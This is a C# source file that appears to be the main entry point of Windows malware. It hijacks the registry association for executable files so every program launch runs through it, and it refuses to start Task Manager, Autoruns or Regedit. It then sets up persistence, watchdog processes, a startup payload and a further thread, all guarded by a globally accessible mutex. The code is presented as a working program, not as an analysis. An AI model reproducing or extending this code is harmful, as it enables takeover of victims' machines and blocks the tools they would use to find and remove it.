using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;

namespace ëntärtäïnër
{
    internal class Program
    {
        public static void Main(string[] args)
        {
            if (args == null || args.Length == 0)
            {
                args = new[] {"run"};
            }
            if (args[0] == "wd")
            {
                WatchDog.Run();
            }
            else
            {
                if (args[0] == "start")
                {
                    if (!new[]{"taskmgr", "autoruns", "autorunsc", "autorunsc64", "autoruns64", "regedit"}.Contains(Path.GetFileNameWithoutExtension(args[1].ToLower())))
                    {
                        Registry.SetValue(Hijack.RegKey2, null, "exefile");
                        try
                        {
                            if (args.Length > 2)
                                Process.Start(args[1], string.Join(" ", args.Skip(2)));
                            else
                                Process.Start(args[1]);
                        } catch { }
                        Registry.SetValue(Hijack.RegKey2, null, Hijack.AppName);
                    }
                }
                if (args[0] == "sleep")
                    Thread.Sleep(1000);
                MutexSecurity securitySettings = new MutexSecurity();
                securitySettings.AddAccessRule(new MutexAccessRule(
                    new SecurityIdentifier(WellKnownSidType.WorldSid, null), MutexRights.FullControl,
                    AccessControlType.Allow));
                using Mutex mutex = new Mutex(false,
                    $"Global\\{{" +
                    $"{((GuidAttribute) Assembly.GetExecutingAssembly().GetCustomAttributes(typeof(GuidAttribute), false).GetValue(0)).Value}}}",
                    out _, securitySettings);
                bool hasHandle = false;
                try
                {
                    try
                    {
                        hasHandle = mutex.WaitOne(5000, false);
                        if (hasHandle == false)
                            throw new TimeoutException("Timeout waiting for exclusive access");
                    }
                    catch (AbandonedMutexException)
                    {
                        Console.WriteLine("Mutex abandoned");
                        hasHandle = true;
                    }
                    Hijack.HijackExe();
                    Persistence.Persist();
                    WatchDog.CreateWDs();
                    //Block
                    StartupPayload.Run();
                    Nagila2Thread.Run();
                }
                finally
                {
                    if (hasHandle)
                        mutex.ReleaseMutex();
                }
            }
        }
    }
}